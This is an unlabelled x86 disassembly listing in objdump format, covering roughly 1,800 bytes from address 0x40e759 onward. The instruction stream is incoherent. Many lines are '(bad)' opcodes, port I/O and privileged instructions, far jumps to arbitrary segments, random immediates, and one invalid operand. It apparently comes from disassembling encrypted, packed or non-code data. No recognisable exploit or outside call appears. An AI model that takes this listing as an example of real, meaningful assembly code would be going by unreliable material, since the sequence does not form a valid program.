  40e759:	sti    
  40e75a:	paddsb mm4,mm7
  40e75d:	das    
  40e75e:	mov    esi,0xf7be5eef
  40e763:	mov    ds:0x3d291e7f,eax
  40e768:	into   
  40e769:	pop    edi
  40e76a:	pop    eax
  40e76b:	in     eax,0x95
  40e76d:	push   ebx
  40e76e:	fwait
  40e76f:	sbb    al,0x3b
  40e771:	mov    esi,0xbf1e57c2
  40e776:	shl    BYTE PTR [ecx+0x63645f17],0xab
  40e77d:	retf   0xab70
  40e780:	push   cs
  40e781:	jb     0x40e79f
  40e783:	dec    edx
  40e784:	jecxz  0x40e7d6
  40e786:	sahf   
  40e787:	test   DWORD PTR [eax-0x51],esp
  40e78a:	push   esi
  40e78b:	or     DWORD PTR [esi+0x4991b490],eax
  40e791:	or     edx,DWORD PTR [ecx-0x46ad6e8c]
  40e797:	and    eax,0xa5892c65
  40e79c:	shl    bh,0x63
  40e79f:	xchg   esp,eax
  40e7a0:	pop    ebp
  40e7a1:	and    DWORD PTR [ebp+0x4b],esi
  40e7a4:	sub    bl,al
  40e7a6:	out    dx,al
  40e7a7:	imul   edx,DWORD PTR [edx+0x7963bdd5],0x7d129c5e
  40e7b1:	out    0x5b,al
  40e7b3:	mov    ebx,0x5b7f408c
  40e7b8:	stos   DWORD PTR es:[edi],eax
  40e7b9:	xchg   esp,eax
  40e7ba:	mov    ebx,0xfa6dde92
  40e7bf:	cli    
  40e7c0:	not    BYTE PTR [ebx+eiz*4]
  40e7c3:	ret    0xe2b8
  40e7c6:	ficomp WORD PTR [ebp-0x58cdd62b]
  40e7cc:	dec    edx
  40e7cd:	test   eax,0x9fbe3d3c
  40e7d2:	push   eax
  40e7d3:	sub    DWORD PTR [ebx+0xc],edi
  40e7d6:	pop    es
  40e7d7:	fnstenv [edi+esi*8+0x4a971f6e]
  40e7de:	and    eax,0x492eddba
  40e7e3:	xchg   edx,eax
  40e7e4:	pop    eax
  40e7e5:	push   es
  40e7e6:	mov    al,ds:0xabcc5bc7
  40e7eb:	in     al,0x1
  40e7ed:	sbb    BYTE PTR [ebx-0xa55fc8c],0x7c
  40e7f4:	lods   al,BYTE PTR ds:[esi]
  40e7f5:	mov    esi,0xcc6dd9b
  40e7fa:	inc    eax
  40e7fb:	mov    ds:0x7899380e,eax
  40e800:	sbb    al,0x49
  40e802:	xchg   ebp,eax
  40e803:	pavgb  mm6,QWORD PTR [ecx+0x5b]
  40e807:	fimul  WORD PTR [eax+0x74086452]
  40e80d:	scas   eax,DWORD PTR es:[edi]
  40e80e:	xchg   ebp,eax
  40e80f:	aas    
  40e810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e811:	dec    eax
  40e812:	adc    eax,0x9db6d6b8
  40e817:	test   BYTE PTR [ebx+0x75c6d292],0x38
  40e81e:	sbb    BYTE PTR [eax+0x1041edd2],ch
  40e824:	loopne 0x40e821
  40e826:	ds aad 0x7a
  40e829:	popf   
  40e82a:	mov    DWORD PTR [ecx+0x50e1c229],ebp
  40e830:	dec    ebp
  40e831:	bnd jo 0x40e85e
  40e834:	out    dx,eax
  40e835:	or     al,0x7
  40e837:	add    esp,DWORD PTR [edx]
  40e839:	or     eax,0x2430a2fb
  40e83e:	mov    ah,BYTE PTR [ebx+0x6]
  40e841:	cmp    ah,BYTE PTR [ebx-0x757bd84f]
  40e847:	adc    eax,edx
  40e849:	xchg   ebx,eax
  40e84a:	mov    cs,WORD PTR [edi+eiz*4-0x6cddec40]
  40e851:	or     al,0x30
  40e853:	repz jl 0x40e83f
  40e856:	inc    esi
  40e857:	cmc    
  40e858:	out    dx,al
  40e859:	into   
  40e85a:	mov    dl,0xd9
  40e85c:	bound  eax,QWORD PTR ds:[edi-0x3cf5e6c0]
  40e863:	loope  0x40e815
  40e865:	add    BYTE PTR [eax],0xb2
  40e868:	or     bl,cl
  40e86a:	or     al,0xcc
  40e86c:	sub    BYTE PTR [edx+0x7690c308],cl
  40e872:	stos   DWORD PTR es:[edi],eax
  40e873:	vpmulhw xmm6,xmm4,XMMWORD PTR [ebx-0x5ab04108]
  40e87b:	push   edx
  40e87c:	mov    eax,ds:0xb4b1af5e
  40e881:	jg     0x40e8c2
  40e883:	scas   eax,DWORD PTR es:[edi]
  40e884:	cmp    DWORD PTR [ecx*8+0x377bdf37],edi
  40e88b:	pop    ds
  40e88c:	std    
  40e88d:	retf   
  40e88e:	add    DWORD PTR [ebp+0x2b8b9f56],ebp
  40e894:	sub    eax,0xe1dcbf8e
  40e899:	cld    
  40e89a:	jns    0x40e865
  40e89c:	jmp    0x9cf3:0xb5d590e6
  40e8a3:	ds das 
  40e8a5:	pop    ecx
  40e8a6:	fisttp WORD PTR [edx]
  40e8a8:	fsubr  DWORD PTR [esi+0x7]
  40e8ab:	ror    BYTE PTR [edi],1
  40e8ad:	nop
  40e8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8af:	cmp    eax,0x36328ac8
  40e8b4:	or     ch,BYTE PTR [edi]
  40e8b6:	and    al,0x10
  40e8b8:	add    esp,DWORD PTR [esp+ecx*4+0x2110e588]
  40e8bf:	sti    
  40e8c0:	retf   0x20c6
  40e8c3:	arpl   WORD PTR [edx+eiz*2-0x76],ax
  40e8c7:	push   0x2a
  40e8c9:	fwait
  40e8ca:	xor    BYTE PTR [eax+0x2],0x93
  40e8ce:	lods   al,BYTE PTR ds:[esi]
  40e8cf:	hlt    
  40e8d0:	ja     0x40e855
  40e8d2:	jnp    0x40e906
  40e8d4:	sub    ah,BYTE PTR [eax+0x48100f6b]
  40e8da:	push   ebx
  40e8db:	xchg   DWORD PTR [edx+0x4],esp
  40e8de:	into   
  40e8df:	(bad)  
  40e8e0:	test   BYTE PTR [edx+ecx*2-0x75],0xe9
  40e8e5:	jne    0x40e873
  40e8e7:	cmp    dl,BYTE PTR [esi+0x74]
  40e8ea:	mov    esp,0x2ca863b2
  40e8ef:	(bad)
  40e8f2:	pop    es
  40e8f3:	test   al,0x3e
  40e8f5:	push   ebx
  40e8f6:	shr    BYTE PTR [ebp-0x2c],0x3d
  40e8fa:	pop    ebp
  40e8fb:	(bad)  
  40e8fc:	in     eax,0xe6
  40e8fe:	pop    esp
  40e8ff:	push   ebp
  40e900:	push   edi
  40e901:	mov    bh,0x1e
  40e903:	(bad)  
  40e904:	mov    ebp,0x76d30021
  40e909:	xor    dl,0x45
  40e90c:	int    0x30
  40e90e:	sub    DWORD PTR [ebx+0x45],0x3eeb5e02
  40e915:	out    0x1a,al
  40e917:	add    eax,0x5618581d
  40e91c:	jl     0x40e8c9
  40e91e:	pop    ebx
  40e91f:	test   al,0xd5
  40e921:	or     BYTE PTR [esi+0x47],0x19
  40e925:	lds    ebp,FWORD PTR [edx-0x4b]
  40e928:	sbb    dl,BYTE PTR [ebx-0x2d]
  40e92b:	rcl    esp,cl
  40e92d:	jmp    0x40e9a4
  40e92f:	adc    cl,BYTE PTR [ebp-0x1c]
  40e932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e933:	push   edx
  40e934:	or     edi,ebx
  40e936:	not    ebx
  40e938:	cli    
  40e939:	add    ebx,edx
  40e93b:	xchg   esi,eax
  40e93c:	xor    BYTE PTR [eax],bl
  40e93e:	or     al,0xe8
  40e940:	jne    0x40e97c
  40e942:	or     bh,BYTE PTR ds:0xf50c060c
  40e948:	in     al,0x23
  40e94a:	iret   
  40e94b:	repz or BYTE PTR [edx+0x25],cl
  40e94f:	jnp    0x40e9af
  40e951:	inc    esi
  40e952:	std    
  40e953:	dec    ecx
  40e954:	pop    edi
  40e955:	xor    BYTE PTR [ebx-0x4],al
  40e958:	out    0x9d,al
  40e95a:	fstp   QWORD PTR [edi+0x57]
  40e95d:	jge    0x40e8ef
  40e95f:	push   edx
  40e960:	dec    ebp
  40e961:	bound  ecx,QWORD PTR [edx+0x71e1a8c5]
  40e967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e968:	out    dx,ax
  40e96a:	jmp    0x40e9e5
  40e96c:	jbe    0x40e9ec
  40e96e:	pop    esp
  40e96f:	sbb    BYTE PTR [esi+0x590e6e6c],al
  40e975:	pop    ebx
  40e976:	pop    ebx
  40e977:	mov    bh,0x52
  40e979:	lods   al,BYTE PTR ds:[esi]
  40e97a:	push   esp
  40e97b:	sub    dl,BYTE PTR [ecx+0x2a]
  40e97e:	add    eax,0xe25ca54
  40e983:	das    
  40e984:	push   esi
  40e985:	jns    0x40e95a
  40e987:	add    esi,DWORD PTR [ebx]
  40e989:	xor    al,0xea
  40e98b:	arpl   WORD PTR [edx+ebp*2-0x75],dx
  40e98f:	dec    esp
  40e990:	dec    esi
  40e991:	iret   
  40e992:	shr    ebx,cl
  40e994:	cmc    
  40e995:	cmp    DWORD PTR [esi+0x62],esi
  40e998:	fwait
  40e999:	mov    ds:0xa5f26c2f,eax
  40e99e:	aas    
  40e99f:	mov    ebp,0x7a274bcc
  40e9a4:	lods   al,BYTE PTR ds:[esi]
  40e9a5:	lods   eax,DWORD PTR ds:[esi]
  40e9a6:	or     eax,0x88c777e8
  40e9ab:	les    edi,FWORD PTR [eax]
  40e9ad:	aam    0x9a
  40e9af:	add    al,0xd5
  40e9b1:	add    eax,0xbcaaa0fc
  40e9b6:	push   ds
  40e9b7:	xor    al,BYTE PTR [edx-0x491dfc90]
  40e9bd:	push   edx
  40e9be:	pop    ds
  40e9bf:	mov    ds:0xd661822e,al
  40e9c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9c5:	mov    al,ds:0x9f464219
  40e9ca:	(bad)  
  40e9cb:	shr    BYTE PTR [eax+0x664faa97],1
  40e9d1:	(bad)  
  40e9d2:	int    0x8b
  40e9d4:	and    BYTE PTR [eax-0x2d],dl
  40e9d7:	test   BYTE PTR [ebp+0x67],cl
  40e9da:	cmp    cl,BYTE PTR [ecx+eax*2-0x1c]
  40e9de:	stc    
  40e9df:	out    0xd,al
  40e9e1:	hlt    
  40e9e2:	xchg   ebx,eax
  40e9e3:	mov    dh,0x45
  40e9e5:	test   BYTE PTR [ecx],dl
  40e9e7:	int3   
  40e9e8:	out    dx,al
  40e9e9:	test   eax,0x3526fbe2
  40e9ee:	pop    esp
  40e9ef:	push   esi
  40e9f0:	mov    eax,0x24d163b8
  40e9f5:	add    cl,cl
  40e9f7:	(bad)  
  40e9f8:	iret   
  40e9f9:	or     eax,eax
  40e9fb:	xchg   ebp,eax
  40e9fc:	jmp    0x40e9dd
  40e9fe:	lock (bad) 
  40ea00:	mov    ah,0x9b
  40ea02:	retf   0xa408
  40ea05:	pop    edx
  40ea06:	ficomp WORD PTR [eax-0x4a2ec599]
  40ea0c:	repnz stos DWORD PTR es:[edi],eax
  40ea0e:	cmc    
  40ea0f:	cmp    al,0x7a
  40ea11:	push   eax
  40ea12:	(bad)  
  40ea13:	pop    edi
  40ea14:	fist   DWORD PTR [ebx]
  40ea16:	mov    al,0x13
  40ea18:	pushf  
  40ea19:	das    
  40ea1a:	xor    cl,BYTE PTR [esi+eiz*8]
  40ea1d:	out    0x3,eax
  40ea1f:	mov    eax,0xe42188ad
  40ea24:	out    dx,eax
  40ea25:	jns    0x40e9d4
  40ea27:	std    
  40ea28:	xlat   BYTE PTR ds:[ebx]
  40ea29:	repnz cmp cl,BYTE PTR [eax+0x29]
  40ea2d:	adc    eax,0x514d4fe1
  40ea32:	xlat   BYTE PTR ds:[ebx]
  40ea33:	xchg   BYTE PTR [ebx+eax*2-0x4],al
  40ea37:	inc    edx
  40ea38:	or     dl,bl
  40ea3a:	in     eax,dx
  40ea3b:	lods   eax,DWORD PTR ss:[esi]
  40ea3d:	push   esi
  40ea3e:	mov    ebx,DWORD PTR [esi-0x51]
  40ea41:	inc    edi
  40ea42:	test   eax,0x68d9a65c
  40ea47:	push   eax
  40ea48:	stos   DWORD PTR es:[edi],eax
  40ea49:	aad    0x18
  40ea4b:	stos   DWORD PTR es:[edi],eax
  40ea4c:	push   esi
  40ea4d:	cmp    ecx,DWORD PTR [ebx+0x6aa58b8b]
  40ea53:	lods   eax,DWORD PTR ds:[esi]
  40ea54:	push   esi
  40ea55:	out    dx,al
  40ea56:	idiv   DWORD PTR [edx+0x6c]
  40ea59:	outs   dx,DWORD PTR ds:[esi]
  40ea5a:	outs   dx,DWORD PTR ds:[esi]
  40ea5b:	mov    bl,0xbd
  40ea5d:	mov    ch,0x45
  40ea5f:	mov    bh,0xdb
  40ea61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea62:	fucomip st,st(3)
  40ea64:	shr    edi,1
  40ea66:	imul   DWORD PTR [ebp-0x7efbeb76]
  40ea6c:	sub    eax,0x374191e2
  40ea71:	outs   dx,BYTE PTR ds:[esi]
  40ea72:	lahf   
  40ea73:	adc    al,0xf4
  40ea75:	pop    edi
  40ea76:	sahf   
  40ea77:	leave  
  40ea78:	jp     0x40eabc
  40ea7a:	adc    bh,ch
  40ea7c:	sub    cl,0xe6
  40ea7f:	fwait
  40ea80:	imul   eax,DWORD PTR [esi+esi*1],0x2d
  40ea84:	dec    ecx
  40ea85:	adc    al,BYTE PTR [esi]
  40ea87:	and    DWORD PTR [ecx],0xffffff83
  40ea8a:	rcl    DWORD PTR [eax-0x18c91253],0xcf
  40ea91:	lods   eax,DWORD PTR ds:[esi]
  40ea92:	and    BYTE PTR [ecx+0x79],dl
  40ea95:	out    dx,eax
  40ea96:	jmp    0x2c13:0x13e31af5
  40ea9d:	cs into 
  40ea9f:	repz cmp eax,0xef9a697f
  40eaa5:	sti    
  40eaa6:	enter  0xca21,0xa5
  40eaaa:	es retf 
  40eaac:	pop    ss
  40eaad:	(bad)  
  40eaae:	stc    
  40eaaf:	fcmovbe st,st(3)
  40eab1:	fwait
  40eab2:	mov    esp,0x4f0aec70
  40eab7:	sbb    eax,0xc9cce75b
  40eabc:	xchg   ebx,eax
  40eabd:	lods   al,BYTE PTR ds:[esi]
  40eabe:	ins    DWORD PTR es:[edi],dx
  40eabf:	ss pusha 
  40eac1:	pop    eax
  40eac2:	xchg   dl,dh
  40eac4:	sbb    BYTE PTR [esi+0x63],bl
  40eac7:	divps  xmm7,XMMWORD PTR [ecx-0x3a]
  40eacb:	mov    ?,WORD PTR ds:0xc396e2f
  40ead1:	mov    eax,ds:0x4a4d6765
  40ead6:	adc    eax,edx
  40ead8:	ins    BYTE PTR es:[edi],dx
  40ead9:	cdq    
  40eada:	inc    eax
  40eadb:	rol    BYTE PTR cs:[edi-0x68],0x6d
  40eae0:	jmp    0xf3ec4a99
  40eae5:	imul   esp,DWORD PTR [esi-0x60],0x7b
  40eae9:	or     ah,BYTE PTR [ecx+esi*4-0x5c]
  40eaed:	mov    bh,0x3c
  40eaef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaf0:	test   al,0x25
  40eaf2:	retf   0x1b68
  40eaf5:	(bad)  
  40eaf6:	xor    ebp,edx
  40eaf8:	mov    al,BYTE PTR [eax+0x26]
  40eafb:	sub    esp,edi
  40eafd:	das    
  40eafe:	inc    edx
  40eaff:	mov    ds:0xedd09249,al
  40eb04:	jbe    0x40ea91
  40eb06:	bound  eax,QWORD PTR [eax]
  40eb08:	mov    eax,cs:0x955f0122
  40eb0e:	mov    dh,0x1b
  40eb10:	add    al,0xa0
  40eb12:	sti    
  40eb13:	dec    eax
  40eb14:	jmp    0x4e217572
  40eb19:	or     BYTE PTR [ebx],0xd5
  40eb1c:	xchg   esp,eax
  40eb1d:	pop    ebx
  40eb1e:	les    ecx,FWORD PTR [ebp-0x6]
  40eb21:	cdq    
  40eb22:	mov    ebx,0x8a952380
  40eb27:	mov    dh,0x5f
  40eb29:	mov    esp,DWORD PTR [ecx]
  40eb2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb2c:	mul    DWORD PTR [esi+0x47]
  40eb2f:	or     ah,0xa3
  40eb32:	and    DWORD PTR [edx],0xffffff86
  40eb35:	xchg   ebx,eax
  40eb36:	mov    edi,0xa2bd7b96
  40eb3b:	xchg   esi,eax
  40eb3c:	push   edi
  40eb3d:	inc    ebp
  40eb3e:	or     al,0x61
  40eb40:	xchg   esi,eax
  40eb41:	dec    edx
  40eb42:	and    eax,0x99272726
  40eb47:	cwde   
  40eb48:	cwde   
  40eb49:	mov    al,0xc8
  40eb4b:	(bad)  
  40eb4c:	mov    ah,0x38
  40eb4e:	mov    gs,WORD PTR [ecx-0x49]
  40eb51:	fld    TBYTE PTR [esi+ebp*2+0x6e]
  40eb55:	adc    al,bh
  40eb57:	xor    ebp,esp
  40eb59:	jb     0x40eaf4
  40eb5b:	dec    edx
  40eb5c:	mov    ecx,0xa43870cc
  40eb61:	xlat   BYTE PTR ds:[ebx]
  40eb62:	jmp    0x40eb55
  40eb64:	fwait
  40eb65:	mov    edi,0x7dbf9bf9
  40eb6a:	jmp    0xc0209141
  40eb6f:	out    dx,eax
  40eb70:	mov    esi,0xdaf8defb
  40eb75:	xlat   BYTE PTR ds:[ebx]
  40eb76:	mov    esi,0xef7bcef6
  40eb7b:	mov    ebp,0x87fdbef7
  40eb80:	push   cs
  40eb81:	sbb    eax,0x2640ca40
  40eb86:	dec    ecx
  40eb87:	adc    BYTE PTR [ebp+0x11],al
  40eb8a:	in     eax,dx
  40eb8b:	push   esi
  40eb8c:	mov    ebp,DWORD PTR [ebp-0x2425d253]
  40eb92:	fcomi  st,st(4)
  40eb94:	je     0x40eb84
  40eb96:	add    cl,bh
  40eb98:	rep ins BYTE PTR es:[edi],dx
  40eb9a:	or     al,0x43
  40eb9c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40eb9e:	pushf  
  40eb9f:	sti    
  40eba0:	push   cs
  40eba1:	add    eax,0xfa5022ef
  40eba6:	mov    al,0x4c
  40eba8:	xchg   edx,eax
  40eba9:	sbb    eax,0xb4cdf3c7
  40ebae:	jl     0x40ec2f
  40ebb0:	mov    edx,0xa74e9d36
  40ebb5:	inc    edi
  40ebb6:	mov    ebx,0xd9dce5dd
  40ebbb:	repz js 0x40ec00
  40ebbe:	push   eax
  40ebbf:	stos   DWORD PTR es:[edi],eax
  40ebc0:	push   ebp
  40ebc1:	test   eax,0xd9ecea37
  40ebc6:	xor    ecx,ebp
  40ebc8:	mov    ebx,0xf807cdf
  40ebcd:	mov    esi,0xd2fc1ef7
  40ebd2:	and    al,0xad
  40ebd4:	not    BYTE PTR [eax-0x1e26c0d1]
  40ebda:	in     al,dx
  40ebdb:	test   eax,0xd89d8e55
  40ebe0:	loop   0x40eb93
  40ebe2:	daa    
  40ebe3:	dec    esi
  40ebe4:	rcr    dl,1
  40ebe6:	mov    ds,WORD PTR [eax]
  40ebe8:	les    esi,FWORD PTR [ebp-0x7a]
  40ebeb:	dec    ecx
  40ebec:	or     eax,0x37804d19
  40ebf1:	or     eax,0x9afc7995
  40ebf6:	xchg   edi,eax
  40ebf8:	add    BYTE PTR [edi+0x445dc43e],cl
  40ebfe:	mov    esp,0x548318a5
  40ec03:	imul   ebx,edx,0xf79a1114
  40ec09:	push   edi
  40ec0a:	push   0xe2b4da40
  40ec0f:	out    dx,al
  40ec10:	fwait
  40ec11:	mov    ebp,DWORD PTR [ebp+edi*2+0x49a0ac80]
  40ec18:	push   ebp
  40ec19:	add    dl,dl
  40ec1b:	or     al,cl
  40ec1d:	mov    ecx,0x1528938e
  40ec22:	add    BYTE PTR [ecx],ch
  40ec24:	or     esp,edi
  40ec26:	test   BYTE PTR [esi+0x3f],bh
  40ec29:	cmp    edx,DWORD PTR [ebp+0x4d1e3f3f]
  40ec2f:	adc    al,0x60
  40ec31:	adc    DWORD PTR [eax-0x702e00c6],0x39e6f47e
  40ec3b:	repz xlat BYTE PTR ds:[ebx]
  40ec3d:	fnstenv [esi-0x7d]
  40ec40:	add    dl,bh
  40ec42:	sahf   
  40ec43:	out    0xd9,eax
  40ec45:	stos   BYTE PTR es:[edi],al
  40ec46:	xor    DWORD PTR [esi-0x2e],eax
  40ec49:	sbb    ecx,DWORD PTR [ecx]
  40ec4b:	scas   eax,DWORD PTR es:[edi]
  40ec4c:	or     BYTE PTR [ebx],bh
  40ec4e:	test   edi,esi
  40ec50:	push   0x40
  40ec52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec53:	(bad)  
  40ec54:	xor    eax,0x420953cf
  40ec59:	lea    edi,[ebx]
  40ec5b:	int    0x6d
  40ec5d:	inc    ebp
  40ec5e:	inc    esi
  40ec5f:	shl    BYTE PTR [edx+0x6ffba376],0xc8
  40ec66:	adc    eax,0xf97d8d78
  40ec6b:	data16 or BYTE PTR [edi+0x33312a54],bh
  40ec72:	xor    eax,ebx
  40ec74:	clc    
  40ec75:	clc    
  40ec76:	cmp    ch,ah
  40ec78:	jb     0x40ecb3
  40ec7a:	xchg   ebx,eax
  40ec7b:	fadd   QWORD PTR [eax+eiz*2]
  40ec7e:	jnp    0x40ecfb
  40ec80:	fwait
  40ec81:	lods   eax,DWORD PTR ds:[esi]
  40ec82:	lods   eax,DWORD PTR ds:[esi]
  40ec83:	sub    eax,0x7c77855b
  40ec88:	jl     0x40ec26
  40ec8a:	push   0xffffffb5
  40ec8c:	dec    edx
  40ec8d:	adc    BYTE PTR [esi+esi*8],al
  40ec90:	push   ds
  40ec91:	pop    edx
  40ec92:	adc    ch,BYTE PTR [edi+edi*1-0xa]
  40ec96:	fsub   DWORD PTR [ebx-0x39]
  40ec99:	pop    ds
  40ec9a:	jnp    0x40ec88
  40ec9c:	mov    cl,0x53
  40ec9e:	adc    BYTE PTR [edi-0x55],0xd5
  40eca2:	call   0xa6a6:0x7b8b8b8b
  40eca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecaa:	es daa 
  40ecac:	es neg BYTE PTR es:[eax+edi*1]
  40ecb1:	jo     0x40ed13
  40ecb3:	outs   dx,BYTE PTR ds:[esi]
  40ecb4:	call   edx
  40ecb6:	shl    dl,cl
  40ecb8:	add    edi,DWORD PTR [edi-0x12]
  40ecbb:	iret   
  40ecbc:	mov    ebp,0x8585cee6
  40ecc1:	or     ebp,0x66
  40ecc4:	jae    0x40ece8
  40ecc6:	push   cs
  40ecc7:	inc    ebx
  40ecc8:	ss aaa 
  40ecca:	aaa    
  40eccb:	fstp   DWORD PTR [eax+0x5f]
  40ecce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eccf:	mov    ds:0x8e388755,eax
  40ecd4:	sub    eax,0x96dafb71
  40ecd9:	pusha  
  40ecda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecdb:	pop    eax
  40ecdc:	scas   al,BYTE PTR es:[edi]
  40ecdd:	(bad)  
  40ecde:	std    
  40ecdf:	and    BYTE PTR [eax-0x4f],dl
  40ece2:	push   cs
  40ece3:	mov    bh,0xa1
  40ece5:	in     eax,0xed
  40ece7:	or     al,BYTE PTR [edx]
  40ece9:	or     bl,al
  40eceb:	mov    BYTE PTR [ebp-0x2829d273],cl
  40ecf1:	aaa    
  40ecf2:	cmp    ecx,esi
  40ecf4:	retf   0x4a29
  40ecf7:	in     eax,0x32
  40ecf9:	mov    ch,0x7a
  40ecfb:	xchg   ebp,eax
  40ecfc:	mov    cl,0xb1
  40ecfe:	xor    esi,ebp
  40ed00:	sahf   
  40ed01:	fwait
  40ed02:	in     al,0xc1
  40ed04:	mov    ebx,0xfbe77c1b
  40ed09:	pop    ss
  40ed0a:	adc    BYTE PTR [ecx+ebx*1],dh
  40ed0d:	les    esp,FWORD PTR [ebp-0x2a]
  40ed10:	aaa    
  40ed11:	add    esi,DWORD PTR [esi-0x416344c9]
  40ed17:	nop
  40ed18:	jo     0x40ed8f
  40ed1a:	jne    0x40eca7
  40ed1c:	scas   eax,DWORD PTR es:[edi]
  40ed1d:	push   ds
  40ed1e:	sbb    eax,0x36f9ec72
  40ed23:	fld    TBYTE PTR [ebp-0xf9a05fc]
  40ed29:	jge    0x40ecd3
  40ed2b:	das    
  40ed2c:	loop   0x40ed83
  40ed2e:	sbb    edi,DWORD PTR [edx]
  40ed30:	cld    
  40ed31:	and    BYTE PTR [ecx],al
  40ed33:	sbb    DWORD PTR [ecx],esp
  40ed35:	loop   0x40ed38
  40ed37:	and    al,0x2d
  40ed39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed3a:	dec    edx
  40ed3b:	cwde   
  40ed3c:	and    BYTE PTR [esi],ah
  40ed3e:	sbb    eax,0x988362b7
  40ed43:	test   BYTE PTR [eax+0x46],al
  40ed46:	or     DWORD PTR [ecx],ebx
  40ed48:	mul    DWORD PTR [edx]
  40ed4a:	inc    esi
  40ed4b:	xor    ecx,eax
  40ed4d:	xor    DWORD PTR [ecx],eax
  40ed4f:	sbb    al,0xc1
  40ed51:	xchg   ebx,eax
  40ed52:	outs   dx,BYTE PTR ds:[esi]
  40ed53:	dec    ecx
  40ed54:	cdq    
  40ed55:	outs   dx,BYTE PTR ds:[esi]
  40ed56:	lods   al,BYTE PTR ds:[esi]
  40ed57:	ret    0x380
  40ed5a:	dec    edi
  40ed5b:	xor    cl,al
  40ed5d:	push   0x0
  40ed5f:	jbe    0x40ed7d
  40ed61:	xchg   esi,eax
  40ed62:	retf   
  40ed63:	stos   BYTE PTR es:[edi],al
  40ed64:	les    ebx,FWORD PTR [esi+edi*4+0x36]
  40ed68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed69:	outs   dx,BYTE PTR ds:[esi]
  40ed6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed6b:	mov    esi,0x7afebe9e
  40ed70:	fld    TBYTE PTR [esi+0x10]
  40ed73:	inc    eax
  40ed74:	pop    edi
  40ed75:	or     BYTE PTR [ecx-0x49],al
  40ed78:	fist   DWORD PTR [ecx-0x3f]
  40ed7b:	das    
  40ed7c:	xor    ch,BYTE PTR ds:0x749aa563
  40ed82:	cwde   
  40ed83:	sbb    BYTE PTR [ecx+0x4f],0x89
  40ed87:	ret    
  40ed88:	or     al,0x8a
  40ed8a:	imul   esp,DWORD PTR [esp+eax*2],0xffffffb8
  40ed8e:	test   eax,0xd7b4e796
  40ed93:	xor    ch,dl
  40ed95:	pop    ebp
  40ed96:	psubd  mm2,QWORD PTR [edi]
  40ed99:	xor    DWORD PTR [ecx+0x54a98e38],eax
  40ed9f:	sub    cl,ah
  40eda1:	int    0xcd
  40eda3:	xor    DWORD PTR ds:0xf7676d3d,edi
  40eda9:	mov    ecx,0x5b5bcd61
  40edae:	pop    ebx
  40edaf:	lods   al,BYTE PTR ds:[esi]
  40edb0:	scas   eax,DWORD PTR es:[edi]
  40edb1:	scas   eax,DWORD PTR es:[edi]
  40edb2:	rcl    ebp,cl
  40edb4:	mov    bl,0xff
  40edb6:	es daa 
  40edb8:	daa    
  40edb9:	imul   esi,DWORD PTR [esi],0x841969b
  40edbf:	and    DWORD PTR [eax],ecx
  40edc1:	ret    
  40edc2:	nop
  40edc3:	retf   
  40edc4:	xchg   edi,eax
  40edc5:	das    
  40edc6:	xor    ebx,DWORD PTR [eax]
  40edc8:	or     al,0x90
  40edca:	push   edx
  40edcb:	not    BYTE PTR [ecx-0x27]
  40edce:	xor    eax,0xf5ec801a
  40edd3:	jp     0x40edc6
  40edd5:	leave  
  40edd6:	xchg   ebx,eax
  40edd7:	daa    
  40edd8:	das    
  40edd9:	mov    ds:0xe8c7434a,al
  40edde:	int3   
  40eddf:	adc    al,0xd5
  40ede1:	push   0xffffffb5
  40ede3:	xor    DWORD PTR [edi],esi
  40ede5:	aaa    
  40ede6:	aaa    
  40ede7:	stc    
  40ede8:	xchg   esi,eax
  40ede9:	mov    bh,0xbc
  40edeb:	in     eax,0x75
  40eded:	pop    es
  40edee:	push   cs
  40edef:	push   ds
  40edf0:	cmp    al,0xfc
  40edf2:	rol    BYTE PTR [ebx-0xf8621f1],1
  40edf8:	lock loope 0x40edf6
  40edfb:	sbb    esi,ebp
  40edfd:	cli    
  40edfe:	inc    esp
  40edff:	sbb    BYTE PTR [ebp-0x54],al
  40ee02:	scas   eax,DWORD PTR es:[edi]
  40ee03:	scas   al,BYTE PTR es:[edi]
  40ee04:	mov    dl,0xb2
  40ee06:	mov    dl,0x42
  40ee08:	mov    bh,0xdd
  40ee0a:	push   esi
  40ee0b:	icebp  
  40ee0c:	or     cl,BYTE PTR [ecx+0x42]
  40ee0f:	mov    al,ds:0xd90d8251
  40ee14:	(bad)  
  40ee15:	or     ch,BYTE PTR [esi+0xc3bc061]
  40ee1b:	ret    0xde5b
  40ee1e:	mov    WORD PTR [ecx+0x74dcf5d3],es
  40ee24:	cmp    edi,DWORD PTR ds:0x573edd7a
  40ee2a:	scas   eax,DWORD PTR es:[edi]
  40ee2b:	lods   al,BYTE PTR ds:[esi]
  40ee2c:	and    al,BYTE PTR [eax+eiz*1+0x1bd40528]
  40ee33:	xor    eax,0x98262726
  40ee38:	call   0xf0ce:0xd7cee09a
  40ee3f:	pop    ss
  40ee40:	mov    edi,0xe37a816d
  40ee45:	and    ch,bl
  40ee47:	or     edi,0xc78f7ada
  40ee4d:	pop    esi
  40ee4e:	call   0x6df2e146
  40ee53:	sahf   
  40ee54:	cmp    DWORD PTR [edx-0x72],edi
  40ee57:	inc    edi
  40ee58:	mov    esi,0xd6ee9972
  40ee5d:	sbb    bh,BYTE PTR [ebp+0x75c424de]
  40ee63:	test   al,0x8f
  40ee65:	inc    ecx
  40ee66:	jne    0x40ee6a
  40ee68:	scas   eax,DWORD PTR es:[edi]
  40ee69:	mov    dl,0xf
  40ee6b:	scas   eax,DWORD PTR es:[edi]
  40ee6c:	out    dx,al
  40ee6d:	test   eax,0x1b519199
  40ee72:	ret    0x4475
